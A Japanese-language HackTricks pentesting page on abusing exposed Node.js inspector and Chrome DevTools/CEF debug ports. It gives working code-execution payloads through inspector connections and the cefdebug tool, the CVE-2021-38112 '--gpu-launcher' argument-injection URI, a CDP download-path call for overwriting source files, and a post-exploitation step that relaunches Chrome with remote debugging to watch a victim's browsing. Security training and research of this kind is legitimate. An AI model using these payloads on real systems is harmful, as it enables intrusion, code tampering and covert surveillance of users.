# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Historical practical examples include the Multimaster walkthrough and the CVE-2019-1414 Visual Studio Code debugger attack; これらはバージョン固有のコンテキストとして利用し、現在のすべての Electron または Chromium target が同じ primitive を公開していると想定しないでください。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本情報

[docs より](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch を付けて起動すると、Node.js process は debugging client の接続を待ち受けます。**default** では、host として **`127.0.0.1`**、port として **`9229`** で待ち受けます。各 process には **unique** な **UUID** も割り当てられます。<sup>[[4]](#references)</sup>

Inspector client は接続するために、host address、port、UUID を把握して指定する必要があります。完全な URL は、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger は Node.js execution environment への full access を持つ**ため、この port に接続できる malicious actor は、Node.js process の権限で arbitrary code を実行できる可能性があります（**potential privilege escalation**）。<sup>[[4]](#references)</sup>

Inspector を起動する方法はいくつかあります。<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
検査対象のプロセスを起動すると、次のようなものが表示されます:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF**（**Chromium Embedded Framework**）をベースとするプロセスでは、`--remote-debugging-port=9222` により debugger が公開されることがあります。これにより、Node.js inspector ではなく [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由で browser が公開されるため、Node.js の `process` ベースの payload はデフォルトでは直接適用できません。<sup>[[2]](#references)[[5]](#references)</sup>

debugger が有効な browser を起動すると、次のようなものが表示されます。<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers、WebSockets、same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browserで開かれたWebサイトは、ブラウザのsecurity modelに従ってWebSocketおよびHTTP requestsを実行できます。**一意のdebugger session idを取得する**には、**初期HTTP接続**が必要です。**same-origin-policy**により、Webサイトが**このHTTP接続**を実行することは**防止されます**。さらに[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**に対する**securityを強化するため、Node.jsは接続の**'Host' headers**が**IP address**または正確に**`localhost`**のいずれかを指定していることを検証します。<sup>[[4]](#references)</sup>

> [!TIP]
> この**security measuresにより、単にHTTP requestを送信するだけで**inspectorをexploitしてcodeを実行することが防止されます（SSRF vulnをexploitすれば実行可能です）。<sup>[[4]](#references)</sup>

### 実行中のprocessesでinspectorを起動する

実行中のnodejs processに**signal SIGUSR1**を送信すると、default portで**inspectorを起動**できます。ただし、十分なprivilegesが必要であるため、これは**process内部の情報へのprivileged access**を与える可能性はありますが、直接的なprivilege escalationではないことに注意してください。<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> これは container で有用です。**process を停止して `--inspect` 付きで新しい process を起動すること**は、**container** が process とともに **kill される**ため、**選択肢にならない**からです。<sup>[[6]](#references)</sup>

### inspector/debugger に接続する

**Chromium-based browser** に接続するには、Chrome または Edge でそれぞれ `chrome://inspect` または `edge://inspect` URL にアクセスできます。Configure ボタンをクリックし、**target host と port** が正しく一覧表示されていることを確認します。この画像は Remote Code Execution (RCE) の例を示しています。<sup>[[2]](#references)[[4]](#references)</sup>

![debugger にアクセスする URL が表示されます。例: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger に接続する: Chromium-based browser に接続するには、...](<../../images/image (674).png>)

**command line** を使用すると、以下で debugger/inspector に接続できます。<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) を使用すると、ローカルで実行中の **inspectors** を**検索**し、そこに**コードを注入**できます。<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> **Chrome DevTools Protocol** 経由で browser に接続している場合、**NodeJS RCE exploits は機能しない**ことに注意してください（API を確認して、利用できる興味深い機能を見つける必要があります）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector での RCE

> [!TIP]
> [**Electron の XSS から RCE を取得する方法**を探してここに来た場合は、このページを確認してください。](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node の **inspector** に **connect** できる場合に **RCE** を取得する一般的な方法として、次のようなものがあります（これは **Chrome DevTools protocol への接続では機能しない**ようです）。<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API はこちらで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
このセクションでは、この protocol を exploit するために人々が使用した興味深いものを列挙します。

### Deep Links 経由の Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) では、Rhino security が、CEF ベースの application がシステムにカスタム UR**I**（workspaces://index.html）を **登録**しており、その application が完全な URI を受け取り、その後、その URI から部分的に構築された configuration で CEF ベースの applicatio**n** を **起動**していることを発見しました。<sup>[[8]](#references)</sup>

URI の parameters が URL decoded され、CEF basic application の起動に使用されていることが発見されました。これにより、user は **command line** に flag **`--gpu-launcher`** を **inject** し、任意の処理を実行できました。<sup>[[8]](#references)</sup>

そのため、次のような payload になります:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exeを実行します。<sup>[[8]](#references)</sup>

### ファイルの上書き

**ダウンロードされたファイルが保存される**フォルダを変更し、ファイルをダウンロードして、アプリケーションで頻繁に使用される**ソースコード**を**悪意のあるコード**で上書きします。<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE と exfiltration

STAR Labs は、公開された WebDriver/CDP services によって arbitrary file reads と RCE が可能になり、一部の構成では DNS rebinding によって exploit chain を完了できることを示しました。<sup>[[9]](#references)</sup>

過去の browser-automation および Chromium security cases の詳細については、Counter WebDriver write-up と Project Zero issues 773、1742、1944 を参照してください。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

実際の環境で、Chrome/Chromium based browser を使用しているユーザー PCを**compromisingした後**、**debuggingを有効化した状態で Chrome process を起動し、debugging port を port-forward**してアクセスできるようにします。これにより、**victim が Chrome で行うすべての操作を inspect し、sensitive information を steal**できるようになります。<sup>[[7]](#references)</sup>

stealth な方法は、**すべての Chrome process を terminate**してから、次のようなコマンドを呼び出すことです:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger の検査および exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger 経由の Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome の Debugging 機能を Abuse して Browsing Session をリモートから Observe および Control する](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding と CDP 経由の WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot から RCE へ](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
